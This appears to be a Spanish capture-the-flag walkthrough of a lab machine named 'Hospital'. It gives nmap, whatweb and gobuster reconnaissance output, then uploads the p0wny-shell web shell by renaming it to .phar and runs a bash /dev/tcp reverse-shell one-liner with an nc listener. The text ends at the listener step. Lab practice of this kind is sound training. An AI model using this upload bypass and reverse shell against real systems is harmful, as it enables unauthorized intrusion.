chsh -s /bin/zsh por defecto

Maquina Hospital 10.10.11.241

❯ ping -c 1 10.10.11.241
PING 10.10.11.241 (10.10.11.241) 56(84) bytes of data.
64 bytes from 10.10.11.241: icmp_seq=1 ttl=127 time=99.5 ms

--- 10.10.11.241 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 99.538/99.538/99.538/0.000 ms


Fase de reconocimiento:

❯ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.241 -oG Puertos
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-19 08:56 CST
Initiating SYN Stealth Scan at 08:56
Scanning 10.10.11.241 [65535 ports]
Discovered open port 445/tcp on 10.10.11.241
Discovered open port 135/tcp on 10.10.11.241
Discovered open port 53/tcp on 10.10.11.241
Discovered open port 139/tcp on 10.10.11.241
Discovered open port 3389/tcp on 10.10.11.241
Discovered open port 443/tcp on 10.10.11.241
Discovered open port 22/tcp on 10.10.11.241
Discovered open port 8080/tcp on 10.10.11.241
Discovered open port 389/tcp on 10.10.11.241
Discovered open port 6619/tcp on 10.10.11.241
Discovered open port 2103/tcp on 10.10.11.241
Discovered open port 3268/tcp on 10.10.11.241
Discovered open port 6406/tcp on 10.10.11.241
Discovered open port 6404/tcp on 10.10.11.241
Discovered open port 88/tcp on 10.10.11.241
Discovered open port 2179/tcp on 10.10.11.241
Discovered open port 9389/tcp on 10.10.11.241
Discovered open port 636/tcp on 10.10.11.241
Discovered open port 6641/tcp on 10.10.11.241
Discovered open port 2105/tcp on 10.10.11.241
Discovered open port 6407/tcp on 10.10.11.241
Discovered open port 6409/tcp on 10.10.11.241
Discovered open port 6613/tcp on 10.10.11.241
Discovered open port 1801/tcp on 10.10.11.241
Discovered open port 2107/tcp on 10.10.11.241
Discovered open port 464/tcp on 10.10.11.241
Discovered open port 3269/tcp on 10.10.11.241
Discovered open port 593/tcp on 10.10.11.241
Discovered open port 5985/tcp on 10.10.11.241
Completed SYN Stealth Scan at 08:56, 39.50s elapsed (65535 total ports)
Nmap scan report for 10.10.11.241
Host is up, received user-set (0.10s latency).
Scanned at 2023-12-19 08:56:15 CST for 40s
Not shown: 65506 filtered tcp ports (no-response)
PORT     STATE SERVICE          REASON
22/tcp   open  ssh              syn-ack ttl 62
53/tcp   open  domain           syn-ack ttl 127
88/tcp   open  kerberos-sec     syn-ack ttl 127
135/tcp  open  msrpc            syn-ack ttl 127
139/tcp  open  netbios-ssn      syn-ack ttl 127
389/tcp  open  ldap             syn-ack ttl 127
443/tcp  open  https            syn-ack ttl 127
445/tcp  open  microsoft-ds     syn-ack ttl 127
464/tcp  open  kpasswd5         syn-ack ttl 127
593/tcp  open  http-rpc-epmap   syn-ack ttl 127
636/tcp  open  ldapssl          syn-ack ttl 127
1801/tcp open  msmq             syn-ack ttl 127
2103/tcp open  zephyr-clt       syn-ack ttl 127
2105/tcp open  eklogin          syn-ack ttl 127
2107/tcp open  msmq-mgmt        syn-ack ttl 127
2179/tcp open  vmrdp            syn-ack ttl 127
3268/tcp open  globalcatLDAP    syn-ack ttl 127
3269/tcp open  globalcatLDAPssl syn-ack ttl 127
3389/tcp open  ms-wbt-server    syn-ack ttl 127
5985/tcp open  wsman            syn-ack ttl 127
6404/tcp open  boe-filesvr      syn-ack ttl 127
6406/tcp open  boe-processsvr   syn-ack ttl 127
6407/tcp open  boe-resssvr1     syn-ack ttl 127
6409/tcp open  boe-resssvr3     syn-ack ttl 127
6613/tcp open  unknown          syn-ack ttl 127
6619/tcp open  odette-ftps      syn-ack ttl 127
6641/tcp open  unknown          syn-ack ttl 127
8080/tcp open  http-proxy       syn-ack ttl 62
9389/tcp open  adws             syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.61 seconds
           Raw packets sent: 196568 (8.649MB) | Rcvd: 48 (2.112KB)

❯ nmap -sCV -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6613,6619,6641,8080,9389 10.10.11.241 -oN Targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-19 09:16 CST
Nmap scan report for 10.10.11.241
Host is up (0.10s latency).

PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-12-19 22:20:05Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2023-09-05T18:39:34
|_Not valid after:  2024-03-06T18:39:34
| rdp-ntlm-info:
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-12-19T22:21:02+00:00
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6613/tcp open  msrpc             Microsoft Windows RPC
6619/tcp open  msrpc             Microsoft Windows RPC
6641/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
|_http-server-header: Apache/2.4.55 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-12-19T22:21:05
|_  start_date: N/A
|_clock-skew: mean: 7h03m18s, deviation: 0s, median: 7h03m18s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.98 seconds


❯ whatweb https://10.10.11.241
https://10.10.11.241 [200 OK] Apache[2.4.56], Bootstrap, Content-Language[en], Cookies[roundcube_sessid], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28], HttpOnly[roundcube_sessid], IP[10.10.11.241], JQuery, OpenSSL[1.1.1t], PHP[8.0.28], PasswordField[_pass], RoundCube, Script, Title[Hospital Webmail :: Welcome to Hospital Webmail], UncommonHeaders[x-robots-tag], X-Frame-Options[sameorigin], X-Powered-By[PHP/8.0.28]

Agregamos a nuestro /etc/hosts/
10.10.11.241  hospital.htb

ingresamos a nuestro navegador y ponemos la direccion https://hospital.htb
luego ingresamos a la http//hospital.htb:8080

creamos un usuario y contraseNa

en este punto prodemos usar gobuster
❯  gobuster dir -u http://10.10.11.241:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.241:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/css                  (Status: 403) [Size: 279]
/fonts                (Status: 403) [Size: 279]
/images               (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 5739]
/js                   (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
/uploads              (Status: 403) [Size: 279]
/vendor               (Status: 403) [Size: 279]
Progress: 4723 / 4724 (99.98%)
===============================================================
Finished
===============================================================

obtenemos el directorio /uploads

aca tenemos un escenario donde podemos cargar una archivo a la pagina web
podriamos usar esta herramienta que genera una shell atraves de la carga
de un archivo 

clonamos esta herramienta : https://github.com/flozz/p0wny-shell.git

al probar la carga del archivo .php no nos lo permite pero una archivo .phar 
si por lo que procedemos a cambiar el nombre y la extencion del archivo y
lo cargamos a la pagina.

ya estando el archivo cargado ingresamos a la siguiente ruta 

http://10.10.11.241:8080/uploads/imagen.phar

obteniendo una shell del servidor desde ahi podemos ejecutar una reverseshell
a nuestro equipo de la siguiente forma:
/usr/bin/bash -c 'bash -i >& /dev/tcp/<nuestra_ip>/<nuestro_puerto> 0>&1'

y nos ponemos en escucha:
nc -lnvp <nuestro_puerto>

